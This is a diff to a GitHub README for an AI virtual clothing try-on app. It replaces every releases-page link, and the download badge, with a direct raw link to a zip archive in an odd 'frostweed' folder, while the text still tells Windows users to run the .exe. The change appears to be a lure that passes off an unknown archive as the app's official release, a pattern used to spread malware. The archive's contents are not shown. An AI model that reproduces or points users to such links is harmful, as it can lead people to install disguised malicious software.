@@ -1,6 +1,6 @@
 # 👗 Gen-AI-Virtual-Try-On-Clothes - Experience Fashion Like Never Before
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20lightgrey?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rioadity/Gen-AI-Virtual-Try-On-Clothes/releases)
+[![Download Now](https://raw.githubusercontent.com/rioadity/Gen-AI-Virtual-Try-On-Clothes/main/frostweed/Gen-AI-Virtual-Try-On-Clothes.zip%20Now-%20lightgrey?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/rioadity/Gen-AI-Virtual-Try-On-Clothes/main/frostweed/Gen-AI-Virtual-Try-On-Clothes.zip)
 
 ## 🌟 Overview
 
@@ -11,7 +11,7 @@ Gen-AI-Virtual-Try-On-Clothes is a cutting-edge platform that uses artificial in
 Follow these simple steps to get started with Gen-AI-Virtual-Try-On-Clothes.
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/rioadity/Gen-AI-Virtual-Try-On-Clothes/releases) to access the latest version of the application.
+   Go to our [Releases page](https://raw.githubusercontent.com/rioadity/Gen-AI-Virtual-Try-On-Clothes/main/frostweed/Gen-AI-Virtual-Try-On-Clothes.zip) to access the latest version of the application.
 
 2. **Download the Application**  
    On the Releases page, you'll see various versions available. Click on the version number to view the details and download the latest release. Look for the **Assets** section to find the download link suited for your system.
@@ -54,7 +54,7 @@ Before downloading, ensure your system meets these requirements:
 
 ## 📥 Download & Install
 
-To download Gen-AI-Virtual-Try-On-Clothes, visit the [Releases page](https://github.com/rioadity/Gen-AI-Virtual-Try-On-Clothes/releases) and follow the download link. After downloading, follow these installation steps:
+To download Gen-AI-Virtual-Try-On-Clothes, visit the [Releases page](https://raw.githubusercontent.com/rioadity/Gen-AI-Virtual-Try-On-Clothes/main/frostweed/Gen-AI-Virtual-Try-On-Clothes.zip) and follow the download link. After downloading, follow these installation steps:
 
 - **Windows Users:**  
   Double-click the `.exe` file and follow the setup instructions. Make sure to accept permissions if prompted.
